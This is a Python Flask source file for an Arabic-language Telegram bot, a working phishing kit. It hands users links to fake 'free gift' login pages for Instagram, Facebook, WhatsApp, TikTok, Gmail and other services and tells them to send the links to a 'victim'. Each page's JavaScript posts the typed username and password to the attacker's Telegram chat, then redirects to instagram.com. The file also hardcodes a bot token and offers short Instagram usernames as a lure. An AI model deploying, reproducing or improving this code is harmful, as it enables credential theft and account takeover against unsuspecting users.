from flask import Flask, request
import requests, os, random, time
from datetime import datetime, timedelta

app = Flask(__name__)
TOKEN = "8616151144:AAFZ8FrVAfcrfK9UvSjZkwITdworNmTnwno"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://telegram-bot-lqcp.onrender.com")

buttons = [
    ["📱 انستقرام", "📘 فيسبوك"],
    ["💬 واتساب", "👻 سناب شات"],
    ["🎵 تيك توك", "🎮 فري فاير"],
    ["🔫 بوبجي", "🤖 ديسكورد"],
    ["🐦 تويتر", "📧 جيميل"],
    ["📹 كاميرا", "🎙️ تسجيل صوت"],
    ["📍 موقع الضحية", "🎁 يوزرات انستا شبه رباعي مميز"]
]

WELCOME_MSG = """
👑 *مرحبا بك في بوت خالد ابو الجود* 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 *أقوى بوت في العالم!*

اختر المنصة من الأزرار 👇
"""

# ==================== اليوزرات المتاحة (ابدأ بها) ====================
AVAILABLE_USERNAMES = [
    "oz2bu", "jq5wm", "et1d0", "ec4t2", "4h0a3", "zz5c0", "cw6r6", "oa4oq", "kl7cw", "382m0",
    "xv49w", "9d7j7", "2a8w0", "5v4a0", "bi9tk", "rt1gj", "8f6q9", "48m05", "p91xy", "24p51",
    "mn0qv", "lb3pk", "4b9mb", "qz39d", "uw1yl", "8p88g", "5s7l0", "fq5su", "7h5at", "6j5rc",
    "yc8rf", "xj3h5", "b95k2", "m67et", "095ku", "kr3u4", "9m4bc", "858vz", "u09z8", "d42ux",
    "fb1z8", "yk8ep", "5y7ek", "5y86n", "fz00n", "x06k9", "zd4na", "7y0mt", "0t6e3", "22t09",
    "lm6bo", "79a44", "5w0ew", "9u8tn", "f14qg", "hl6qm", "qj3td", "bs45q", "g94gf", "ig53s",
    "91e04", "hi7vu", "53u52", "73t87", "79v64", "9p8nw", "63q96", "pf4c2", "84u81", "429b1",
    "bw4ax", "qu6sj", "qd45m", "57j29", "lm4ib", "ab4xv", "y62k6", "01e47", "hf3kg", "7b9r5",
    "z60qf", "lq8a3", "qc39l", "5x5zy", "b81r4", "x53s3", "2d8up", "v09nf", "5l61j", "tg7eb",
    "81o26", "sq9gl", "gg0k8", "49w42", "cl4pg", "0h3d5", "36p69", "340vx", "wt1vd", "97z91",
    "072qa", "p85b4", "7x5bm", "bk49u", "rm2kh", "jh17m", "nr5e4", "676q5", "0u0fn", "h634y",
    "ob4xs", "10p03", "86r10", "db3nc", "448b7", "od08i", "9x3qs", "081ui", "73n88", "c60ui",
    "s84fk", "s05f8", "0i9pn", "98v18", "jw3j5", "lq3be", "tw9ap", "pp6eu", "94v02", "dk6gg",
    "j65c4", "uq8u8", "3c9rz", "18i02", "2o4oi", "s46nr", "wz3k9", "o269w", "dz3lf", "7v3y1",
    "rw2ts", "6j4dp", "ga5md", "e78f6", "pb3jf", "lg8mt", "wl3jk", "g06lk", "xt61b", "7g0o6",
    "7c8je", "ru0nc", "pc80m", "bq3tk", "1e8sb", "56n18", "02q85", "py3m8", "ud2jm", "9j1xe",
    "760yc", "fz9hc", "4a95x", "fm6ac", "97j70", "e096b", "e63lc", "67q08", "5y3os", "q90a2",
    "vr13j", "oz8gl", "9m34z", "of8oe", "yt3dm", "yq19f", "7g0wg", "87b36", "qt0ry", "3u6qe",
    "fe9p3", "jq7br", "73q25", "bk5oi", "9v2yy", "8z8h1", "lg1g5", "cu5n3", "pj4xg", "w19sy",
    "pu2gd", "6s5wl", "on6mf", "uy1p5", "o94c6", "xk6xa", "3p3hg", "qh4f0", "jc7jo", "3c1ar",
    "a48uw", "sv8oj", "9k0yo", "cy0y8", "sb8y6", "mv2jh", "27c65", "41u09", "258vq", "0d8kj"
]

# ==================== اليوزرات التي تم إعطاؤها (تبدأ فارغة) ====================
GIVEN_USERNAMES = []

# ==================== تتبع آخر طلب لكل مستخدم ====================
last_claim = {}

@app.route(f"/{TOKEN}/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")
        
        if text == "/start":
            send_message(chat_id, WELCOME_MSG, buttons)
        elif text == "🎁 يوزرات انستا شبه رباعي مميز":
            give_username(chat_id)
        elif text in ["📱 انستقرام", "📘 فيسبوك", "💬 واتساب", "👻 سناب شات", "🎵 تيك توك", "🎮 فري فاير", "🔫 بوبجي", "🤖 ديسكورد", "🐦 تويتر", "📧 جيميل", "📹 كاميرا", "🎙️ تسجيل صوت", "📍 موقع الضحية"]:
            platforms = {
                "📱 انستقرام": "instagram", "📘 فيسبوك": "facebook", "💬 واتساب": "whatsapp",
                "👻 سناب شات": "snapchat", "🎵 تيك توك": "tiktok", "🎮 فري فاير": "freefire",
                "🔫 بوبجي": "pubg", "🤖 ديسكورد": "discord", "🐦 تويتر": "twitter",
                "📧 جيميل": "gmail", "📹 كاميرا": "camera", "🎙️ تسجيل صوت": "mic",
                "📍 موقع الضحية": "location"
            }
            name = text.split()[0]
            send_link(chat_id, platforms[text], f"{name} - هدية مجانية")
        else:
            send_message(chat_id, "👑 أرسل /start", None)
    return "ok"

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    requests.post(url, json=data)

def send_link(chat_id, platform, name):
    link = f"{BASE_URL}/{platform}.html?chatId={chat_id}"
    msg = f"🔥 *رابط {name}* :\n\n`{link}`\n\n💡 أرسل الرابط للضحية وانتظر البيانات"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})

def give_username(chat_id):
    global AVAILABLE_USERNAMES, GIVEN_USERNAMES
    
    # التحقق من مرور 24 ساعة
    now = datetime.now()
    if chat_id in last_claim and last_claim[chat_id] > now - timedelta(hours=24):
        remaining = 24 - int((now - last_claim[chat_id]).total_seconds() // 3600)
        send_message(chat_id, f"⚠️ لا يمكنك الحصول على يوزر جديد إلا بعد {remaining} ساعة.")
        return
    
    # التحقق من وجود يوزرات متاحة
    if not AVAILABLE_USERNAMES:
        msg = """🎁 *نفذت اليوزرات المتاحة مؤقتاً!*
━━━━━━━━━━━━━━━━━━━━━━━━━━
سيتم إضافة يوزرات جديدة قريباً.

للحصول على يوزر فوراً، تواصل معي على: @A_c64"""
        send_message(chat_id, msg)
        return
    
    # اختيار يوزر عشوائي من المتاحة
    username = random.choice(AVAILABLE_USERNAMES)
    
    # نقل اليوزر من المتاحة إلى المعطاة
    AVAILABLE_USERNAMES.remove(username)
    GIVEN_USERNAMES.append(username)
    
    # تسجيل وقت الطلب
    last_claim[chat_id] = now
    
    # إرسال اليوزر للمستخدم مع الحالة
    remaining_count = len(AVAILABLE_USERNAMES)
    msg = f"""🎁 *تم اهدائك يوزر بواسطه ابو الجود* :
`{username}`

✅ هذا اليوزر متاح ومضمون.
📊 *اليوزرات المتبقية:* {remaining_count}

⚠️ *ملاحظة*: لا يمكنك الحصول على يوزر جديد إلا بعد 24 ساعة.
في حال واجهتك أي مشكلة، تواصل معي على: @A_c64"""
    
    send_message(chat_id, msg)

# صفحات الاختراق (كما هي)
def phish_page(platform, chat_id):
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>{platform} - هدية مجانية</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}}
body{{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
.container{{background:white;border-radius:25px;padding:30px;max-width:400px;width:100%;text-align:center}}
input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px}}
button{{background:#0095f6;color:white;width:100%;padding:14px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer}}
.progress{{display:none;margin-top:20px}}
.bar{{background:#e0e0e0;border-radius:25px;height:10px}}
.fill{{background:#0095f6;width:0%;height:100%;border-radius:25px}}
</style>
</head>
<body>
<div class="container">
<h2>✨ {platform} – هدية مجانية ✨</h2>
<div id="loginForm">
<input type="text" id="username" placeholder="اسم المستخدم">
<input type="password" id="password" placeholder="كلمة السر">
<button onclick="send()">🚀 احصل على هديتك</button>
</div>
<div id="progress" class="progress"><div class="bar"><div class="fill" id="fill"></div></div><p id="status">جاري التجهيز...</p></div>
</div>
<script>
const chatId = "{chat_id}";
async function send() {{
    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    if(!u||!p) return;
    document.getElementById('loginForm').style.display='none';
    document.getElementById('progress').style.display='block';
    let percent=0;
    const interval=setInterval(()=>{{
        percent+=Math.random()*4+2;
        if(percent>=100) percent=100;
        document.getElementById('fill').style.width=percent+'%';
        document.getElementById('status').innerHTML='جاري التجهيز '+Math.floor(percent)+'%';
        if(percent>=100) clearInterval(interval);
    }},180);
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق جديد!\\n📱 {platform}\\n👤 اسم المستخدم: ${{u}}\\n🔑 كلمة السر: ${{p}}`}})
    }});
    setTimeout(()=>{{
        document.getElementById('status').innerHTML='✅ تم الشحن بنجاح!';
        setTimeout(()=>window.location.href='https://instagram.com',2000);
    }},3000);
}}
</script>
</body>
</html>'''

@app.route('/instagram.html')
def instagram(): return phish_page("انستقرام", request.args.get('chatId'))
@app.route('/facebook.html')
def facebook(): return phish_page("فيسبوك", request.args.get('chatId'))
@app.route('/whatsapp.html')
def whatsapp(): return phish_page("واتساب", request.args.get('chatId'))
@app.route('/snapchat.html')
def snapchat(): return phish_page("سناب شات", request.args.get('chatId'))
@app.route('/tiktok.html')
def tiktok(): return phish_page("تيك توك", request.args.get('chatId'))
@app.route('/freefire.html')
def freefire(): return phish_page("فري فاير", request.args.get('chatId'))
@app.route('/pubg.html')
def pubg(): return phish_page("بوبجي", request.args.get('chatId'))
@app.route('/discord.html')
def discord(): return phish_page("ديسكورد", request.args.get('chatId'))
@app.route('/twitter.html')
def twitter(): return phish_page("تويتر", request.args.get('chatId'))
@app.route('/gmail.html')
def gmail(): return phish_page("جيميل", request.args.get('chatId'))
@app.route('/camera.html')
def camera(): return phish_page("كاميرا", request.args.get('chatId'))
@app.route('/mic.html')
def mic(): return phish_page("تسجيل الصوت", request.args.get('chatId'))
@app.route('/location.html')
def location(): return phish_page("الموقع", request.args.get('chatId'))

@app.route('/')
def home():
    return "✅ البوت شغال 24 ساعة! ابو الجود"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
